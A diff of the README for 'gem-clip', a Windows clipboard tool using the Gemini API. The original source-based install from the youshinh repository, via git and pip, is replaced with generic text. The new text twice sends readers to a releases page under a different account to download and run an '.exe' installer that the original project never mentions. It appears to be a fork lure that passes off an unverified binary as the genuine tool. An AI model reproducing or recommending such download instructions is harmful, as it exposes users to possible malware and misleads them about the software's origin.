@@ -1,120 +1,99 @@
-# Gem Clip
+# 🎉 gem-clip - Boost Your Clipboard Efficiency
 
-[![Main Screen](img/main_list.png)](img/main_list.png)
+## 🚀 Getting Started
 
-**Gem Clip** is a desktop tool for Windows designed to instantly process clipboard content and files using the Google Gemini API.
+Welcome to gem-clip! This tool helps you manage your clipboard content efficiently. You can process text, images, and files quickly using hotkeys. It's designed to enhance your productivity on Windows.
 
-With a simple hotkey, you can summon pre-registered prompts to streamline a variety of tasks, including text proofreading, summarization, translation, brainstorming, and text extraction from images (OCR).
+## 🌟 Features
 
-## ✨ Features
+- **Clipboard Processing:** Manage text, images, and files seamlessly.
+- **Hotkey Support:** Assign custom hotkeys for quick access.
+- **Google Gemini API Integration:** Utilize advanced features for improved functionality.
+- **Word Recognition:** Convert images into text using OCR technology.
+- **User-Friendly Interface:** Simple and easy to navigate.
 
-*   **🚀 Instant Access with Hotkeys:** Bring up the prompt selection window anytime with a hotkey like `Ctrl+Shift+C`.
-*   **📋 Versatile Input Sources:** Automatically recognizes text, images, and file paths on the clipboard. Files can also be attached via drag-and-drop.
-*   **🔧 Customizable Prompts:** Freely add, edit, and reorder prompts to suit your needs. You can also configure parameters like the model and temperature for each prompt.
-*   **📊 Powerful Matrix Processing:** Batch-process multiple input data (rows) against multiple prompts (columns). This is highly effective for tasks like market research analysis or generating multiple variations of text.
-*   **🌐 Multi-language Support:** The UI can be switched between Japanese and English.
-*   **🤫 Secure API Key Management:** Your API key is securely stored in the OS credential manager.
+## 📥 Download & Install
 
-## 📥 Installation
+To get started with gem-clip, you need to download the application. Visit this page to download:
 
-### Prerequisites
+[Download gem-clip](https://github.com/Yousef-Hany209/gem-clip/releases)
 
-*   Windows OS
-*   Python 3.9 or higher
+You will find different versions available for download. Select the version that matches your needs and click on it.
 
-### Steps
+### 📋 System Requirements
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/youshinh/gem-clip.git
-    cd gem-clip
-    ```
+- Windows 10 or later
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet connection for API access
 
-2.  **Install dependencies:**
-    The project requires several libraries. Install them with the following command:
-    ```bash
-    pip install google-generativeai customtkinter pystray pillow pyperclip keyring ctkmessagebox
-    ```
+## ⚙️ Installation Steps
 
-3.  **Get a Google AI API Key:**
-    Visit [Google AI for Developers](https://ai.google.dev/) to obtain your API key.
+1. **Download the Installer:**
+   After visiting the release page, look for the latest version and click on the `.exe` file to download it.
 
-## 🚀 Usage
+2. **Run the Installer:**
+   Locate the downloaded file in your Downloads folder or wherever you saved it. Double-click on the installer to start the installation process.
 
-### 1. Launch and Set Up API Key
+3. **Follow the On-Screen Instructions:**
+   A setup wizard will open. Follow the prompts to complete the installation. Accept the license agreement and choose the installation folder. Click "Next" until the installation begins.
 
-1.  Launch the application with the following command:
-    ```bash
-    python -m gemclip
-    ```
-    On the first launch, an icon will appear in your system tray.
+4. **Finish Installation:**
+   Once the installation is complete, you will see a confirmation message. Click "Finish" to exit the setup wizard.
 
-2.  Right-click the tray icon and select "Settings".
-    [![Settings Screen](img/setting.png)](img/setting.png)
+## 🔑 Quick Start Guide
 
-3.  In the settings window, enter your Google AI API key in the "API Key" field and click the "Save & Close" button.
+1. **Open gem-clip:**
+   Find the shortcut on your desktop or in the Start Menu. Double-click it to open the application.
 
-### 2. Managing Prompts
+2. **Set Up Hotkeys:**
+   Go to the settings menu. Here, you can assign hotkeys for various clipboard actions. Choose combinations that are easy for you to remember.
 
-Open the "Prompt Manager" from the tray menu to display the main window.
+3. **Start Using gem-clip:**
+   After setting up the hotkeys, you're ready to go. Use the assigned keys to process your clipboard content efficiently.
 
-[![Prompt Manager Screen](img/prompt_manage.png)](img/prompt_manage.png)
+## 🛠️ Using Features
 
-*   **Add:** Create a new prompt with the `+ Add Prompt` button.
-*   **Edit:** Modify the name, system prompt, model, parameters, and more using the "Edit" button for each prompt.
-*   **Reorder:** Drag and drop the "≡" handle on each row to change the display order of prompts.
-*   **Delete:** Remove unnecessary prompts with the "Delete" button.
+- **Clipboard Content:**
+   Copy any text, image, or file to the clipboard. When you press your designated hotkey, gem-clip will process this content based on your settings.
 
-[![Prompt Settings Screen](img/prompt_setting.png)](img/prompt_setting.png)
+- **OCR Functionality:**
+   For images containing text, use the OCR feature to convert it to editable text. Simply copy the image and press the hotkey you assigned for OCR.
 
-### 3. Basic Usage (Executing a Prompt)
+- **Integration with Google Gemini API:**
+   With an active internet connection, gem-clip uses the Google Gemini API for advanced processing. Make sure you have an API key set up if needed.
 
-1.  Copy the text or image you want to process to your clipboard.
-2.  Display the prompt selection screen in one of the following ways:
-    *   Press the hotkey (default: `Ctrl+Shift+C`).
-    *   Left-click the system tray icon.
-    *   Right-click the system tray icon and select "Prompt List" from the menu.
-3.  The prompt selection window will appear at your cursor's location. Click the prompt you want to execute.
-    [![Prompt Selection Screen](img/main_list.png)](img/main_list.png)
-4.  The process will run, and upon completion, the result will be copied to your clipboard, and a desktop notification will appear.
+## 💡 Tips for Best Practices
 
-### 4. Free Input
+- **Keep the Tool Updated:**
+   Regularly check the releases page to download the latest version. Updates may include new features or important fixes.
 
-Select "Free Input" from the prompt selection window to open a dedicated dialog.
+- **Explore Settings:**
+   Spend some time exploring the settings. You can customize gem-clip to fit your workflow better.
 
-[![Free Input Screen](img/free_input.png)](img/free_input.png)
+- **Utilize Hotkeys:**
+   The more you use hotkeys, the more efficient you will become. Practice frequently to remember your assigned combinations.
 
-Here, you can enter instructions directly to perform one-off tasks. You can also attach files from this screen.
+## 🆘 Troubleshooting
 
-### 5. Matrix Batch Processing
+If you encounter any issues while using gem-clip, consider the following steps:
 
-Select "Matrix Processor" from the tray menu to open the matrix processing window.
+1. **Reinstall the Application:**
+   If gem-clip does not work as expected, uninstall it from the Control Panel. Download the latest version from the releases page and reinstall it.
 
-1.  **Input Data:** Enter the data you want to process in the left text area, one item per line (e.g., product reviews, customer questions).
-    [![Matrix Input Screen](img/matrix_input.png)](img/matrix_input.png)
+2. **Check Your Internet Connection:**
+   For features relying on the Google Gemini API, ensure your internet connection is stable.
 
-2.  **Preview and Execute:** Click the "Preview" button to generate a table with your input data as rows and prompts as columns. Check the cells you want to execute and click the "Run Selected" button.
-    [![Matrix Preview Screen](img/matrix_preview.png)](img/matrix_preview.png)
+3. **Review API Key Settings:**
+   If you opted to use advanced features, ensure your API key is valid and set up properly within the application settings.
 
-3.  **Review Results:** Once processing is complete, the results will be displayed in each cell. You can also generate summaries for each row or column.
-    [![Matrix Result Screen](img/matrix_rowcol_result.png)](img/matrix_rowcol_result.png)
-    [![Matrix Summary Screen](img/matrix_rowcol_summary.png)](img/matrix_rowcol_summary.png)
+4. **Consult the Community:**
+   If problems persist, check the issues section on the GitHub repository. You may find solutions others have shared.
 
-## 💻 Development
+## 📞 Support
 
-*   **Run the application:**
-    ```bash
-    python -m gemclip
-    ```
-    Options:
-    *   `--lang [en|ja]`: Specify the UI language.
-    *   `--theme [system|light|dark]`: Specify the theme.
+For further assistance, feel free to reach out to the community on GitHub. Open an issue in the repository for any specific questions or problems you face with gem-clip.
 
-*   **Run tests:**
-    ```bash
-    python -m pytest -q
-    ```
+Remember, you can always download the latest version of gem-clip from this page:
 
-## 📄 License
-
-This project is licensed under the MIT License.
+[Download gem-clip](https://github.com/Yousef-Hany209/gem-clip/releases)
